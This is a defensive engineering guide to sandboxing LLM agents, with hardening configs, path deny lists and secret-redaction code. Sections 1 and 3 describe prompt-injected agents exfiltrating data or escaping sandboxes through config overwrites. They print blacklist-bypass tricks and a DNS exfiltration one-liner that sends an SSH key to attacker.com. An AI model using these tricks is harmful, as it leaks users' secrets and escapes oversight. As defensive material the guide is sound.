# Sandboxing, Security Boundaries, and Least Agency

> **Core Security Law:** Trust the LLM to reason; **never** trust the LLM to self-police. System prompts, `AGENTS.md`, and regex command blacklists are soft guidance—every security invariant must be enforced deterministically by OS/container boundaries and out-of-model Policy Enforcement Points (PEP/PDP).

## Table of Contents

1. [OWASP Top 10 for Agentic Applications (2026) & Least Agency](#1-owasp-top-10-for-agentic-applications-2026--least-agency)
2. [The Lethal Trifecta](#2-the-lethal-trifecta)
3. [The Dual-Boundary Rule: Filesystem + Network Egress Proxy](#3-the-dual-boundary-rule-filesystem--network-egress-proxy)
4. [Host-Native OS Confinement](#4-host-native-os-confinement)
5. [Hardened Container & MicroVM Configuration](#5-hardened-container--microvm-configuration)
6. [Zero-Credential Sandboxes (Vault + Host Proxy)](#6-zero-credential-sandboxes-vault--host-proxy)
7. [Path Canonicalization & Case-Normalized Deny Lists](#7-path-canonicalization--case-normalized-deny-lists)
8. [Secret Redaction & PII Tokenization](#8-secret-redaction--pii-tokenization)
9. [Verification Checklist](#9-verification-checklist)

---

## 1. OWASP Top 10 for Agentic Applications (2026) & Least Agency

The **OWASP Top 10 for Agentic Applications (2026)** establishes two architectural axioms:

1. **Least Agency:** Grant the minimum autonomy, tool surface, privilege scope, and credential lifetime needed. Do not deploy an autonomous agent where a deterministic workflow suffices.
2. **Deterministic Complete Mediation (PEP/PDP):** Every sensitive tool call passes through deterministic Policy Enforcement Point (PEP) / Policy Decision Point (PDP) code outside the model before execution.

| ID | OWASP Agentic 2026 Risk | LLM Top 10 (2025) | Deterministic Harness Mitigation |
|---|---|---|---|
| **ASI01** | **Agent Goal Hijack** | `LLM01`, `LLM06` | Treat all external text/RAG/tool outputs as untrusted data; lock system prompt & goal spec under config control; validate runtime intent capsules. |
| **ASI02** | **Tool Misuse and Exploitation** | `LLM06` | Per-tool least-privilege profiles (read-only defaults); PEP/PDP intent gate; dry-run diffs; egress allowlists (blocks DNS tunneling via benign tools like `ping`); version-pinned namespaced tools. |
| **ASI03** | **Identity and Privilege Abuse** | `LLM01`, `LLM02`, `LLM06` | Distinct non-human agent identities; short-lived task-scoped JIT tokens bound to intent; zero unscoped privilege inheritance across subagents; re-validate auth per privileged action (anti-TOCTOU). |
| **ASI04** | **Agentic Supply Chain Vulnerabilities** | `LLM03` | Pin prompts, MCP servers, container images (`@sha256`), and tool schemas by content hash; SBOM/AIBOM attestation; emergency supply-chain kill switch. |
| **ASI05** | **Unexpected Code Execution (RCE)** | `LLM01`, `LLM05` | Ban `eval()`/`exec()`/`shell=True` (`AH002`/`AH003`); never run as root; isolate code in OS/container/microVM sandboxes; block writable host mounts (`AH006`); protect IDE/workspace config files case-insensitively. |
| **ASI06** | **Memory & Context Poisoning** | `LLM01`, `LLM04`, `LLM08` | Validate memory writes before commit; isolate per-tenant/per-session namespaces; forbid auto-re-ingestion of unverified agent outputs into trusted long-term memory; provenance + TTL + rollback. |
| **ASI07** | **Insecure Inter-Agent Communication** | `LLM02`, `LLM06` | Mutual auth (mTLS/PKI); signed messages + context hashes; anti-replay nonces/timestamps/session IDs; typed versioned contracts; reject protocol downgrades. |
| **ASI08** | **Cascading Failures** | `LLM01`, `LLM04`, `LLM06` | Decouple planner from executor via independent policy engine; per-run blast-radius quotas & fan-out rate limits; digital-twin trace replay before loosening policies. |
| **ASI09** | **Human-Agent Trust Exploitation** | `LLM01`, `LLM05`, `LLM06`, `LLM09` | Plain-language deterministic risk diffs (never model-only rationales); side-effect-free read-only previews; combat approval fatigue via real sandboxing. |
| **ASI10** | **Rogue Agents** | `LLM02`, `LLM09` | Signed behavioral manifests checked per action; watchdog monitors; 3-rejection breaker; instant kill switch + credential revocation; HSM/KMS-mediated signing outside agent runtime. |

### Why Regex Blacklists Fail (`AH004`)

Filtering shell strings with a denylist (`if "rm -rf" in cmd or "curl" in cmd: block()`) is a security illusion. Trivial bypasses include base64 decoding (`echo ... | base64 -d | sh`), `$IFS` whitespace substitution, symlinks, environment variable expansion, or `python -c` / `node -e`. Replace command blacklists with OS/container confinement and explicit `argv` lists (`shell=False`, `execFile`).

---

## 2. The Lethal Trifecta

Simon Willison's **Lethal Trifecta** proves that any agent combining all three capabilities simultaneously is structurally vulnerable to prompt-injection data exfiltration (documented across 14+ production systems including GitHub's official MCP server and M365 Copilot):

1. **Access to private data** (local files, private repos, databases, email, credentials).
2. **Exposure to untrusted content** (web pages, public GitHub issues, external emails, PDFs, third-party tool outputs).
3. **An outbound communication channel** (arbitrary HTTP egress, sending emails, opening PRs/comments, rendering external markdown images).

LLMs concatenate instructions and untrusted data into one flat token stream—even a "95% prompt-injection detector" is a failing grade because attackers iterate until they hit the 5%. **Structural fix:** architecturally break at least one leg of the trifecta per run (e.g., disable arbitrary egress while reading private files + untrusted web content, isolate untrusted browsing into a zero-private-data subagent, or require deterministic PEP + human approval with full payload visibility on every outbound action).

---

## 3. The Dual-Boundary Rule: Filesystem + Network Egress Proxy

Anthropic's Claude Code sandboxing research proved that **filesystem isolation and network isolation are mutually dependent**:

- **Filesystem-only isolation fails:** A prompt-injected agent can still read workspace secrets or exfiltrate private code over HTTP or DNS tunneling.
- **Network-only isolation fails:** A prompt-injected agent can overwrite host configs (`.bashrc`, `.cursor/cli.json`, `.vscode/tasks.json`, `.git/hooks/`, `compose.yaml`) to escape the sandbox and gain unrestricted network access and RCE on the next command.

### Architecture & Measured Impact

Combine OS-level filesystem confinement with an **out-of-sandbox network egress proxy**:

1. Strip direct network access inside the sandbox (`--unshare-net` on Linux `bwrap`, deny-network profile on Seatbelt, `network_mode: none` in Docker).
2. Expose a single **Unix Domain Socket (UDS)** (or loopback bridge FD) into the sandbox connected to a host-side HTTP/SOCKS5 proxy.
3. **Resolve DNS only inside the host proxy *after* domain-allowlist approval** (OpenAI Codex pattern)—preventing DNS exfiltration (`dig $(base64 ~/.ssh/id_rsa).attacker.com`).
4. Apply confinement to **all spawned child processes** automatically (kernel-enforced inheritance).

In Anthropic's internal evaluation, dual-boundary sandboxing cut interactive permission prompts by **84%** while strengthening security—directly mitigating `ASI09` approval fatigue.

---

## 4. Host-Native OS Confinement

Host-native confinement preserves local toolchains (SDKs, compilers, simulators) with near-zero startup latency while enforcing kernel boundaries across all child processes.

| Platform | Production Mechanism | Key Enforcement Controls |
|---|---|---|
| **Linux** | **`bubblewrap` (`bwrap`)** + **`seccomp-bpf`** (fallback: **Landlock LSM**) | Mount/PID/IPC/Net namespaces (`--unshare-all --die-with-parent`), `--ro-bind` system libs, `--bind` workspace only, `--ro-bind` protected dotfiles *after* workspace bind, UDS proxy socket, seccomp syscall filter. |
| **macOS** | **Seatbelt** (`sandbox-exec` SBPL profile) | `(deny default)`, explicit `(allow file-write* (subpath WORKSPACE))` paired with explicit `(deny file-write* ...)` overrides on `.git`/configs, `(deny network-outbound)` except the proxy UDS. |
| **Windows** | **Restricted Token + ACLs** (`dsh` `sandbox-windows-acl`) or **MXC** (OpenAI Codex) | Low-privilege restricted token with explicit DACLs granting write access only to the workspace SID, blocking sensitive user profile dirs and IDE/git config files, plus Windows Job Objects (`KILL_ON_JOB_CLOSE`) for child-process tree cleanup. |

### Mandatory Read-Only Protections Inside Writable Workspaces

Even in `workspace-write` mode, mount or ACL-protect high-leverage control paths as **read-only** so a compromised agent cannot plant persistent code execution triggers:

- `.git/` (prevents `.git/hooks/` and `.git/config` `core.fsmonitor` / `sshCommand` RCE)
- `.vscode/`, `.cursor/`, `.codex/`, `.agents/`, `.claude/` (prevents IDE task/MCP/CLI config hijacking)
- `.aws/`, `.ssh/`, `.gnupg/`, `.npmrc`, `.pypirc` (never mounted or accessible inside sandbox)

### Linux `bubblewrap` Invocation Example

```bash
bwrap \
  --unshare-all --die-with-parent --new-session \
  --ro-bind /usr /usr --ro-bind /bin /bin --ro-bind /lib /lib \
  --proc /proc --dev /dev --tmpfs /tmp \
  --bind "$WORKSPACE" /workspace \
  --ro-bind "$WORKSPACE/.git" /workspace/.git \
  --ro-bind "$PROXY_SOCK" /run/egress-proxy.sock \
  --chdir /workspace \
  --clearenv \
  --setenv PATH /usr/bin:/bin \
  --setenv HTTP_PROXY "http+unix://%2Frun%2Fegress-proxy.sock" \
  -- /usr/bin/pytest -q
```

---

## 5. Hardened Container & MicroVM Configuration

When executing untrusted code, running multi-tenant workloads, or running reproducible evals (Inspect AI, SWE-bench, OpenHands, Anthropic Managed Agents), escalate from host-native confinement to **ephemeral containers** or **microVMs** (Firecracker, gVisor, Kata, KVM):

| Tier | Boundary Strength | Best For |
|---|---|---|
| **Hardened Container (Docker/Podman)** | Shared host kernel; namespace + cgroup + seccomp + capability drop | Trusted-tenant CI/eval sandboxes, reproducible tool execution. |
| **gVisor / Firecracker MicroVM** | Userspace kernel / dedicated guest kernel + hardware virtualization | Untrusted multi-tenant code execution, arbitrary internet browsing, OSWorld GUI agents. |

### Non-Negotiable Docker Hardening Rules (`AH006`)

1. **`network_mode: none`** by default (route approved traffic only via controlled sidecar/UDS proxy).
2. **`init: true`** (tini PID 1 reaps zombies and forwards `SIGTERM` cleanly on cancellation).
3. **Pinned immutable digests (`@sha256:<64-hex>`)**—never mutable `:latest` tags (`ASI04`).
4. **Explicit resource caps:** `cpus`, `mem_limit`, `pids_limit`, and bounded exec/file output limits (e.g., Inspect AI `10 MB` exec cap, `100 MB` file read cap).
5. **No writable host bind mounts:** Use `:ro` mounts or copy task files into an ephemeral container layer/volume. Writable host mounts let an adversarial agent overwrite `compose.yaml` or plant symlinks for subsequent runs.
6. **Non-root user + dropped capabilities:** `user: "10001:10001"`, `cap_drop: ["ALL"]`, `security_opt: ["no-new-privileges:true"]`, `read_only: true` rootfs with size-capped `/tmp` tmpfs. Never mount `/var/run/docker.sock` or set `privileged: true`.

```yaml
# Hardened sandbox compose template (passes AH006)
services:
  agent-sandbox:
    image: python:3.12-slim@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
    init: true
    network_mode: none
    user: "10001:10001"
    read_only: true
    cap_drop:
      - ALL
    security_opt:
      - no-new-privileges:true
    cpus: 2.0
    mem_limit: 2g
    pids_limit: 256
    tmpfs:
      - /tmp:rw,noexec,nosuid,size=256m
      - /workspace:rw,nosuid,size=512m
    volumes:
      - ./fixtures:/fixtures:ro
```

---

## 6. Zero-Credential Sandboxes (Vault + Host Proxy)

Never pass raw `os.environ` / `process.env` (`AH005`), cloud IAM keys, GitHub PATs, SSH keys, or MCP OAuth refresh tokens into the agent's execution environment.

**Anthropic Managed Agents / Claude Code Web Pattern:**

1. **Secrets stay in an external vault** accessible only to a host-side validating proxy.
2. **Sandbox receives a short-lived, session-scoped opaque handle** (e.g., `SANDBOX_PROXY_TOKEN`) valid *only* against the host proxy.
3. **Host proxy enforces operation semantics** before attaching the real credential (e.g., allowing `git push` only to `refs/heads/agent/*` on one specific repository, or allowing MCP tool calls only to approved tenant endpoints).
4. **Subprocess environment uses a strict allowlist** (`PATH`, `LANG`, `LC_ALL`, `HOME=/tmp`) rather than copying parent env vars.

### Python 3.11+ — Strict Subprocess Environment Allowlist

```python
import os
import subprocess
from pathlib import Path

SAFE_ENV_KEYS = ("PATH", "LANG", "LC_ALL", "TERM")


def build_clean_env(workspace: Path, extra_non_secret: dict[str, str] | None = None) -> dict[str, str]:
    """Construct a zero-credential environment allowlist for sandboxed tools."""
    env = {k: os.environ[k] for k in SAFE_ENV_KEYS if k in os.environ}
    env["HOME"] = str(workspace)
    env["PYTHONDONTWRITEBYTECODE"] = "1"
    if extra_non_secret:
        for k, v in extra_non_secret.items():
            if any(tok in k.upper() for tok in ("KEY", "TOKEN", "SECRET", "PASS", "AUTH")):
                raise ValueError(f"Refusing to inject credential-like env var '{k}' into sandbox.")
            env[k] = v
    return env


def run_sandboxed_argv(argv: list[str], workspace: Path, timeout_s: float = 30.0) -> subprocess.CompletedProcess[str]:
    """Invoke a command with argv list (shell=False), clean env, and mandatory timeout."""
    return subprocess.run(
        argv,
        cwd=str(workspace),
        env=build_clean_env(workspace),
        shell=False,
        capture_output=True,
        text=True,
        timeout=timeout_s,
        check=False,
    )
```

---

## 7. Path Canonicalization & Case-Normalized Deny Lists

Simple string prefix checks (`path.startswith(workspace)`) are defeated by `..` traversal, symlinks pointing outside the workspace, and **case-mismatch attacks** on case-insensitive filesystems (macOS APFS / Windows NTFS — OWASP Agentic 2026 Appendix D documented a real exploit bypassing a lowercase `.cursor/cli.json` deny rule via `.Cursor/CLI.json`).

Enforce three steps on every filesystem tool call:

1. Resolve both `workspace_root` and the candidate `target` with `realpath` / `Path.resolve()`.
2. Verify containment via `is_relative_to` (Python) or `path.relative` without leading `..` (Node), checking **every path component** against symlink escape.
3. Normalize every path segment with Unicode NFC + `.casefold()` / `.toLowerCase()` before checking against protected config/secret deny lists.

### Python 3.11+ — Safe Workspace Path Resolver

```python
import unicodedata
from pathlib import Path

DENIED_SEGMENTS = frozenset({
    ".git", ".ssh", ".aws", ".gnupg", ".cursor", ".vscode", ".agents", ".codex", ".claude",
})
DENIED_FILENAMES = frozenset({
    ".env", ".env.local", ".env.production", "mcp.json", "compose.yaml", "compose.yml", "docker-compose.yml",
})


def resolve_safe_path(workspace_root: Path, user_path: str, *, allow_write: bool = False) -> Path:
    """Canonicalize a path, enforce workspace containment, and block protected paths case-insensitively."""
    root = workspace_root.resolve(strict=True)
    candidate = (root / user_path).resolve(strict=False)

    if not candidate.is_relative_to(root):
        raise PermissionError(f"Path '{user_path}' escapes workspace root.")

    rel_parts = candidate.relative_to(root).parts
    norm_parts = [unicodedata.normalize("NFC", part).casefold() for part in rel_parts]

    for seg in norm_parts:
        if seg in DENIED_SEGMENTS:
            raise PermissionError(f"Access to protected directory '{seg}' is denied.")
    if norm_parts and norm_parts[-1] in DENIED_FILENAMES:
        raise PermissionError(f"Access to protected file '{norm_parts[-1]}' is denied.")
    if allow_write and candidate == root:
        raise PermissionError("Refusing to overwrite workspace root directory.")

    return candidate
```

### TypeScript (strict ESM) — Safe Workspace Path Resolver

```typescript
import { realpath } from "node:fs/promises";
import { isAbsolute, relative, resolve, sep } from "node:path";

const DENIED_SEGMENTS = new Set([
  ".git", ".ssh", ".aws", ".gnupg", ".cursor", ".vscode", ".agents", ".codex", ".claude",
]);
const DENIED_FILES = new Set([
  ".env", ".env.local", ".env.production", "mcp.json", "compose.yaml", "compose.yml", "docker-compose.yml",
]);

export async function resolveSafePath(workspaceRoot: string, rawPath: string): Promise<string> {
  const canonicalRoot = await realpath(workspaceRoot);
  const candidate = resolve(canonicalRoot, rawPath);

  // Resolve existing parent to catch symlink escapes even when target file does not yet exist.
  let canonicalCandidate: string;
  try {
    canonicalCandidate = await realpath(candidate);
  } catch {
    canonicalCandidate = candidate;
  }

  const rel = relative(canonicalRoot, canonicalCandidate);
  if (rel.startsWith("..") || isAbsolute(rel)) {
    throw new Error(`Path '${rawPath}' escapes workspace root.`);
  }

  const parts = rel
    .split(sep)
    .filter((p) => p.length > 0)
    .map((p) => p.normalize("NFC").toLowerCase());

  for (const seg of parts) {
    if (DENIED_SEGMENTS.has(seg)) {
      throw new Error(`Access to protected directory '${seg}' is denied.`);
    }
  }
  const leaf = parts[parts.length - 1];
  if (leaf && DENIED_FILES.has(leaf)) {
    throw new Error(`Access to protected file '${leaf}' is denied.`);
  }
  return canonicalCandidate;
}
```

---

## 8. Secret Redaction & PII Tokenization

Secrets leak into LLM context windows, exception messages, and OTel traces (`gen_ai.tool.call.*`, `exception.message`, `gen_ai.skill.source.uri`, signed URLs `?X-Amz-Signature=...`). Apply two deterministic filters at the harness boundary:

1. **Outbound/Trace Secret Redaction:** Run a compiled regex scrubber over every tool output, exception string, URI, and JSONL trace line *before* appending to model context or disk (matching the exact patterns verified by `scripts/validate_trace.py`).
2. **Reversible PII Tokenization (MCP / Data Pipelines):** When agents process customer records across tools (Anthropic *Code Execution with MCP*), tokenize PII (`alice@example.com -> [EMAIL_1]`, phone numbers, SSNs) in the host tool client *before* returning data to the model, and detokenize inside downstream authorized tool sinks so raw PII never traverses the LLM.

### Python 3.11+ — Secret Scrubber & Reversible PII Tokenizer

```python
import re

SECRET_PATTERNS: tuple[tuple[str, re.Pattern[str]], ...] = (
    ("anthropic_key", re.compile(r"sk-ant-[A-Za-z0-9_-]{16,}")),
    ("openai_key", re.compile(r"sk-[A-Za-z0-9_-]{20,}")),
    ("google_key", re.compile(r"AIza[0-9A-Za-z_-]{35}")),
    ("aws_access_key", re.compile(r"AKIA[0-9A-Z]{16}")),
    ("github_pat", re.compile(r"gh[pousr]_[A-Za-z0-9]{20,}")),
    ("pem_private_key", re.compile(r"-----BEGIN [A-Z0-9 ]*PRIVATE KEY-----[\s\S]*?-----END [A-Z0-9 ]*PRIVATE KEY-----")),
    ("bearer_token", re.compile(r"(?i)Bearer\s+[A-Za-z0-9._-]{20,}")),
    ("signed_url_param", re.compile(r"([?&](?:X-Amz-Signature|token|sig|api_key)=)[^&\s]+")),
)


def redact_secrets(text: str) -> str:
    redacted = text
    for name, pattern in SECRET_PATTERNS:
        if name == "signed_url_param":
            redacted = pattern.sub(r"\1[REDACTED]", redacted)
        else:
            redacted = pattern.sub(f"[REDACTED:{name}]", redacted)
    return redacted


class SessionPiiTokenizer:
    """Session-scoped reversible PII tokenizer keeping raw PII out of LLM context."""

    _EMAIL_RE = re.compile(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b")

    def __init__(self) -> None:
        self._forward: dict[str, str] = {}
        self._reverse: dict[str, str] = {}
        self._counter = 0

    def tokenize(self, text: str) -> str:
        def _sub(match: re.Match[str]) -> str:
            raw = match.group(0)
            if raw not in self._forward:
                self._counter += 1
                token = f"[EMAIL_{self._counter}]"
                self._forward[raw] = token
                self._reverse[token] = raw
            return self._forward[raw]

        return self._EMAIL_RE.sub(_sub, text)

    def detokenize(self, text: str) -> str:
        result = text
        for token, raw in self._reverse.items():
            result = result.replace(token, raw)
        return result
```

### TypeScript (strict ESM) — Secret Redactor

```typescript
const SECRET_PATTERNS: ReadonlyArray<readonly [string, RegExp]> = [
  ["anthropic_key", /sk-ant-[A-Za-z0-9_-]{16,}/g],
  ["openai_key", /sk-[A-Za-z0-9_-]{20,}/g],
  ["google_key", /AIza[0-9A-Za-z_-]{35}/g],
  ["aws_access_key", /AKIA[0-9A-Z]{16}/g],
  ["github_pat", /gh[pousr]_[A-Za-z0-9]{20,}/g],
  ["pem_private_key", /-----BEGIN [A-Z0-9 ]*PRIVATE KEY-----[\s\S]*?-----END [A-Z0-9 ]*PRIVATE KEY-----/g],
  ["bearer_token", /Bearer\s+[A-Za-z0-9._-]{20,}/gi],
];

const SIGNED_URL_RE = /([?&](?:X-Amz-Signature|token|sig|api_key)=)[^&\s]+/g;

export function redactSecrets(input: string): string {
  let out = input.replace(SIGNED_URL_RE, "$1[REDACTED]");
  for (const [label, regex] of SECRET_PATTERNS) {
    out = out.replace(regex, `[REDACTED:${label}]`);
  }
  return out;
}
```

---

## 9. Verification Checklist

- [ ] **Deterministic PEP/PDP:** Zero safety boundaries rely on system prompts or regex command blacklists (`AH004`); `shell=False` / `execFile` and zero `eval`/`exec` (`AH002`/`AH003`).
- [ ] **Lethal Trifecta broken:** No agent run combines unrestricted private data + untrusted content + unapproved arbitrary outbound egress.
- [ ] **Dual boundary enforced:** Both filesystem confinement (`bwrap`+`seccomp`/Landlock, Seatbelt, Windows Restricted Token+ACL/MXC, or Docker/microVM) AND egress proxy resolving DNS post-allow are active.
- [ ] **Hardened containers (`AH006`):** `network_mode: none`, `init: true`, `@sha256` pinned images, non-root user, `cpus`/`mem_limit`/`pids_limit`, zero writable host bind mounts, zero `privileged: true` or `docker.sock`.
- [ ] **Zero-credential sandbox (`AH005`):** Real API keys, SSH keys, and git tokens live outside the sandbox behind a validating host proxy; subprocesses receive only a strict env allowlist.
- [ ] **Path & config protection:** `realpath` containment + NFC case-normalized deny lists protect `.git`, `.vscode`, `.cursor`, `.agents`, `.env`, and `mcp.json`.
- [ ] **Redaction & PII hygiene:** Tool outputs, exceptions, URIs, and JSONL traces pass through `redact_secrets()`; sensitive pipelines tokenize PII before model ingestion.
